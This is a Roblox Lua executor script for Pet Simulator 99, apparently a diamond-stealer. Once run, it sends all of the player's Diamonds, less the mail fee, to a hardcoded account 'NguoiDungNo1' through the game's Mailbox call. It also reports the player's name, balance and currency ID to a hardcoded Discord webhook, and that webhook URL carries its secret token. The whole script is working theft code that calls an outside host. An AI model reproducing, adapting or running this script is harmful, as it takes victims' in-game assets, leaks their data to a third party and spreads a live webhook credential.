-- PS99 Send Diamonds - ZapHub exact format
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(0.5) end

-- ===== CONFIG =====
local TARGET   = "NguoiDungNo1"
local MESSAGE  = "GG"
local SEND_ALL = true    -- true = gửi tất cả (trừ phí), false = gửi DIAMONDS dưới
local DIAMONDS = 20000   -- Chỉ dùng khi SEND_ALL = false
-- ==================

d("📬 **SEND DIAMONDS (ZapHub format)**\n`"..plr.Name.."` → `"..TARGET.."`", 0xffaa00)

-- Require modules
local network = require(RS.Library.Client.Network)
local save = require(RS.Library.Client.Save).Get().Inventory

-- Lấy mailSendPrice từ getgc() → computeSendMailCost
local mailSendPrice = 20000 -- default
for _, func in pairs(getgc()) do
    if type(func)=="function" then
        local info = debug.getinfo(func)
        if info and info.name == "computeSendMailCost" then
            local ok, price = pcall(func)
            if ok and type(price)=="number" then
                mailSendPrice = price
                d("✅ mailSendPrice = **"..mailSendPrice.."**", 0x00ff00)
            end
            break
        end
    end
end

-- Lấy diamond amount và UID
local GemAmount = 0
local currencyUID = nil

for i, v in pairs(save.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am or 0
        currencyUID = i
        d("✅ Diamonds: **"..GemAmount.."** | UID: `"..tostring(i).."`", 0x00ff00)
        break
    end
end

if not currencyUID then
    d("❌ Không tìm thấy Diamonds trong Save.Inventory.Currency!", 0xff0000)
    return
end

-- Tính số gửi
local sendAmount
if SEND_ALL then
    sendAmount = GemAmount - mailSendPrice
else
    sendAmount = DIAMONDS
end

if sendAmount <= 0 then
    d("❌ Không đủ diamonds! Cần > "..mailSendPrice.." để trả phí\nHiện có: "..GemAmount, 0xff0000)
    return
end

d("🔄 Gửi **"..sendAmount.."💎** → `"..TARGET.."`\n(Phí: "..mailSendPrice.." | Còn lại: "..(GemAmount-sendAmount-mailSendPrice)..")", 0xffaa00)

-- INVOKE: (username, message, category, uid, amount)
local response, err = network.Invoke("Mailbox: Send",
    TARGET,
    MESSAGE,
    "Currency",
    currencyUID,
    sendAmount
)

if response == true then
    d("✅ **THÀNH CÔNG!**\n💎 **"..sendAmount.."** → `"..TARGET.."`", 0x00ff88)
elseif response == false then
    d("❌ **Server từ chối:**\n`"..tostring(err).."`\n\nGợi ý:\n• Tài khoản "..TARGET.." inbox đầy?\n• Cần đứng ở đúng server?", 0xff0000)
else
    d("⚠️ Response lạ:\nresponse=`"..tostring(response).."`\nerr=`"..tostring(err).."`", 0xff8800)
end
